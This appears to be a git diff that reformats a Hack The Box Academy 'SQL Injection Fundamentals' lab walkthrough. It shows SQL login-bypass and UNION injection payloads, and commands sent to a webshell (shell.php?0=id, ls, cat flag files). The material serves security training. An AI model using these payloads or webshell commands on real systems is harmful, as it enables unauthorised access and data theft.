@@ -73,9 +73,9 @@ This module covers the core principles of SQL injection across multiple database
 
 #### Technical Methodology & Exploit Execution:
 
-mysql -h <target-IP> -u <username> -P <target-port> -
-p<password>
-*notice there is no space between the 'p' and '<password>'. *
+`mysql -h <target-IP> -u <username> -P <target-port> -`
+p`<password>`
+*notice there is no space between the 'p' and '`<password>`'. *
 Credentials will be provided by the sections, unless specified otherwise.
 This method will be referred as 'default login' throughout the module.
 
@@ -151,9 +151,9 @@ We have 'dept_name' and 'dept_no', we are provided with the 'dept_name'
 'Development', and we need to find the matching 'dept_no'. For that we will
 ```bash
 use the query:
-```
 select dept_no from departments where dept_name =
 "Development";
+```
 
 ![Figure 4.1 — Lab execution and output verification (Page 4)](/assets/images/posts/htb-academy/sql-injection-fundamentals/p004_01.jpg)
 *_Figure 4.1 — Lab execution and output verification (Page 4)_*
@@ -226,7 +226,7 @@ not like '%engineer%';
 #### Technical Methodology & Exploit Execution:
 
 lets enter the target machine URL in the browser:
-http://<target-IP>:<target-port>
+`http://<target-IP>:<target-port>`
 
 
 
@@ -234,7 +234,7 @@ There are several sql injections we can do here:
 Method 1: we will use 'or injection':
 userame:
 tom' or '1'='1
-password: <any>
+password: `<any>`
 
 ![Figure 7.1 — Lab execution and output verification (Page 7)](/assets/images/posts/htb-academy/sql-injection-fundamentals/p007_01.jpg)
 *_Figure 7.1 — Lab execution and output verification (Page 7)_*
@@ -249,7 +249,7 @@ password: <any>
 Method 2: we will use comment:
 Username:
 tom' -- '
-password:<any>:
+password:`<any>`:
 
 ![Figure 8.1 — Lab execution and output verification (Page 8)](/assets/images/posts/htb-academy/sql-injection-fundamentals/p008_01.jpg)
 *_Figure 8.1 — Lab execution and output verification (Page 8)_*
@@ -274,7 +274,7 @@ password:<any>:
 we will use the query:
 Username:
 <invalid username>') or (id = 5) --
-password: <any>
+password: `<any>`
 
 ![Figure 9.1 — Lab execution and output verification (Page 9)](/assets/images/posts/htb-academy/sql-injection-fundamentals/p009_01.jpg)
 *_Figure 9.1 — Lab execution and output verification (Page 9)_*
@@ -326,7 +326,7 @@ departments) AS combined;
 #### Technical Methodology & Exploit Execution:
 
 first, lets enter the target website on the browser:
-http://<target-IP>:<target-port>
+`http://<target-IP>:<target-port>`
 we get to this search page:
 
 Random search of port code, lets say 'jp' will give us this:
@@ -478,18 +478,18 @@ The page itself wont show anything interesting here.
 ### to test the webshell
 
 However lets go in the browser to
-http://<target-IP>:<target-port>/shell.php?0=id
+`http://<target-IP>:<target-port>/shell.php?0=id`
 to test the webshell:
 
 It works!
 
 Now we need to find the flag, it would be in the parent directory:
-http://<target-IP>:<target-port>/shell.php?0=ls ..
+`http://<target-IP>:<target-port>/shell.php?0=ls ..`
 
 
 
 Lets take it:
-http://<target-IP>:<target-port>/shell.php?0=cat ../flag.txt
+`http://<target-IP>:<target-port>/shell.php?0=cat ../flag.txt`
 
 ![Figure 17.1 — Lab execution and output verification (Page 17)](/assets/images/posts/htb-academy/sql-injection-fundamentals/p017_01.jpg)
 *_Figure 17.1 — Lab execution and output verification (Page 17)_*
@@ -512,7 +512,7 @@ http://<target-IP>:<target-port>/shell.php?0=cat ../flag.txt
 #### Technical Methodology & Exploit Execution:
 
 lets start with opening the target website on the browser:
-http://<target-IP>:<target-port>
+`http://<target-IP>:<target-port>`
 
 
 We got to a login panel.
@@ -522,7 +522,7 @@ injection payload, we will simply get this:
 Incorrect credentials.. but there is a way to sql-inject to the login panel:
 We will enter the username:
 cn' UNION select 1,2,3-- -
-and password: <any>
+and password: `<any>`
 *we use here union of 3 elements. which might take trial and error process to
 detect. *
 
@@ -568,12 +568,12 @@ access denied. *
 
 We won't see anything  on the dashboard after the file write query, however –
 lets test the webshell on the brower URL:
-http://<target-IP>:<target-port>/shell.php?0=ls /
+`http://<target-IP>:<target-port>/shell.php?0=ls /`
 
 
 The flag's file name is 'flag_cae1dadcd174.txt'. lets cat it:
 
-http://<target-IP>:<target-port>/shell.php?0=cat
+`http://<target-IP>:<target-port>/shell.php?0=cat`
 /flag_cae1dadcd174.txt
 
 ![Figure 20.1 — Lab execution and output verification (Page 20)](/assets/images/posts/htb-academy/sql-injection-fundamentals/p020_01.png)
